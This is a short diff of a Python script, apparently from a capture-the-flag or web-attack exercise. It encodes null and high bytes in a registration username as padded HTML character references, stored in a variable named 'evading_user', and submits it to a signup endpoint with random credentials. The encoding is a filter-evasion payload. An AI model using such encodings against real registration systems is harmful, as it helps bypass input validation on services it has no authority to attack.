@@ -30,11 +30,15 @@ def main():
         register_user = urllib.parse.quote_from_bytes(r[1])
         print("{} => {}".format(r[0], register_user))
 
-        register_user = "4&#00000004&#0000097&#0000097"
+        evading_user = register_user.replace('%00', '&#00000000').replace('%80', '&#00000128')
+        #register_user = "4&#00000004&#0000097&#0000097"
         register_email = generate_random_emails(1, 15)[0]
-        register_pwd   = "123456789"
-        print(register_user, register_email, register_pwd)
-        status, data = stick_register(register_user, register_email, register_pwd)
+        register_pwd   = get_random_name(letters, 12)
+
+        
+
+        print(evading_user, register_email, register_pwd)
+        status, data = stick_register(evading_user, register_email, register_pwd)
         print("Code: {}".format(status))
         if status == 200:
             resp = data.getvalue().decode()
